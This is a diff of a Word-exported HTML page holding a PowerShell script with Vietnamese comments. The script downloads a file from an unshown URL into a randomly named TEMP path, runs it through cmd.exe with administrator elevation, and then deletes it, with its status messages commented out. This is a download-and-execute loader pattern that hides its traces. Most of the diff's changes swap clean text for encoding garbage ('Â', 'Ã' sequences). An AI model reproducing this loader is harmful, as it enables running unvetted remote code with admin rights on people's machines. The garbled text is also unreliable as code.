@@ -2,7 +2,7 @@
 
 <head>
 <meta charset="UTF-8">
-<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+#<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
 <meta name=Generator content="Microsoft Word 15 (filtered)">
 <style>
 <!--
@@ -46,10 +46,10 @@ t&#7893;ng h&#417;p nhi&#7873;u ngu&#7891;n</b></p>
 
 <p class=MsoNormal>try {</p>
 
-<p class=MsoNormal>    # S&#7917; d&#7909;ng TLS 1.2 cho k&#7871;t n&#7889;i
+<p class=MsoNormal>Â Â Â  # S&#7917; d&#7909;ng TLS 1.2 cho k&#7871;t n&#7889;i
 HTTPS</p>
 
-<p class=MsoNormal>    [Net.ServicePointManager]::SecurityProtocol =
+<p class=MsoNormal>Â Â Â  [Net.ServicePointManager]::SecurityProtocol =
 [Net.SecurityProtocolType]::Tls12</p>
 
 <p class=MsoNormal>} catch {}</p>
@@ -62,7 +62,7 @@ HTTPS</p>
 
 <p class=MsoNormal>&nbsp;</p>
 
-<p class=MsoNormal># T&#7841;o tên file ng&#7851;u nhiên trong th&#432; m&#7909;c
+<p class=MsoNormal># T&#7841;o tÃªn file ng&#7851;u nhiÃªn trong th&#432; m&#7909;c
 TEMP</p>
 
 <p class=MsoNormal>$rand = [guid]::NewGuid().ToString()</p>
@@ -75,30 +75,30 @@ TEMP</p>
 
 <p class=MsoNormal>try {</p>
 
-<p class=MsoNormal>    Invoke-WebRequest -Uri $url -OutFile $tempPath
+<p class=MsoNormal>Â Â Â  Invoke-WebRequest -Uri $url -OutFile $tempPath
 -ErrorAction Stop</p>
 
-<p class=MsoNormal>#    Write-Host &quot;Tai file thanh cong: $tempPath&quot;</p>
+<p class=MsoNormal>#Â Â Â  Write-Host &quot;Tai file thanh cong: $tempPath&quot;</p>
 
 <p class=MsoNormal>} catch {</p>
 
-<p class=MsoNormal>    Write-Error &quot;Khong the tai file t&#7915; $url&quot;</p>
+<p class=MsoNormal>Â Â Â  Write-Error &quot;Khong the tai file t&#7915; $url&quot;</p>
 
-<p class=MsoNormal>    return</p>
+<p class=MsoNormal>Â Â Â  return</p>
 
 <p class=MsoNormal>}</p>
 
 <p class=MsoNormal>&nbsp;</p>
 
-<p class=MsoNormal># Ki&#7875;m tra file &#273;ã &#273;&#432;&#7907;c t&#7841;o
+<p class=MsoNormal># Ki&#7875;m tra file &#273;Ã£ &#273;&#432;&#7907;c t&#7841;o
 ch&#432;a</p>
 
 <p class=MsoNormal>if (-not (Test-Path $tempPath)) {</p>
 
-<p class=MsoNormal>    Write-Error &quot;File khong ton tai sau khi tai ve.
+<p class=MsoNormal>Â Â Â  Write-Error &quot;File khong ton tai sau khi tai ve.
 Dung lai.&quot;</p>
 
-<p class=MsoNormal>    return</p>
+<p class=MsoNormal>Â Â Â  return</p>
 
 <p class=MsoNormal>}</p>
 
@@ -110,37 +110,37 @@ Dung lai.&quot;</p>
 
 <p class=MsoNormal>try {</p>
 
-<p class=MsoNormal># N&#7871;u không mu&#7889;n chuy&#7875;n admin thì thay
-Start-Process -FilePath &quot;cmd.exe&quot; ... thì thay thành &amp; cmd.exe /c
+<p class=MsoNormal># N&#7871;u khÃ´ng mu&#7889;n chuy&#7875;n admin thÃ¬ thay
+Start-Process -FilePath &quot;cmd.exe&quot; ... thÃ¬ thay thÃ nh &amp; cmd.exe /c
 &quot;`&quot;$tempPath`&quot;&quot;</p>
 
-<p class=MsoNormal>#    &amp; cmd.exe /c &quot;`&quot;$tempPath`&quot;&quot;</p>
+<p class=MsoNormal>#Â Â Â  &amp; cmd.exe /c &quot;`&quot;$tempPath`&quot;&quot;</p>
 
-<p class=MsoNormal>    Start-Process -FilePath &quot;cmd.exe&quot;
+<p class=MsoNormal>Â Â Â  Start-Process -FilePath &quot;cmd.exe&quot;
 -ArgumentList &quot;/c `&quot;$tempPath`&quot;&quot; -Verb RunAs -Wait</p>
 
 <p class=MsoNormal>} catch {</p>
 
-<p class=MsoNormal>    Write-Error &quot;Khong the thuc thi file:
+<p class=MsoNormal>Â Â Â  Write-Error &quot;Khong the thuc thi file:
 $($_.Exception.Message)&quot;</p>
 
-<p class=MsoNormal>    return</p>
+<p class=MsoNormal>Â Â Â  return</p>
 
 <p class=MsoNormal>}</p>
 
 <p class=MsoNormal>&nbsp;</p>
 
-<p class=MsoNormal># Xoá file sau khi th&#7921;c thi xong</p>
+<p class=MsoNormal># XoÃ¡ file sau khi th&#7921;c thi xong</p>
 
 <p class=MsoNormal>try {</p>
 
-<p class=MsoNormal>    Remove-Item $tempPath -Force</p>
+<p class=MsoNormal>Â Â Â  Remove-Item $tempPath -Force</p>
 
-<p class=MsoNormal>#    Write-Host &quot;&#272;ã xoá file: $tempPath&quot;</p>
+<p class=MsoNormal>#Â Â  Â Write-Host &quot;&#272;Ã£ xoÃ¡ file: $tempPath&quot;</p>
 
 <p class=MsoNormal>} catch {</p>
 
-<p class=MsoNormal>    Write-Warning &quot;Khong the xoa file:
+<p class=MsoNormal>Â Â Â  Write-Warning &quot;Khong the xoa file:
 $($_.Exception.Message)&quot;</p>
 
 <p class=MsoNormal>}</p>
@@ -152,3 +152,4 @@ $($_.Exception.Message)&quot;</p>
 </body>
 
 </html>
+
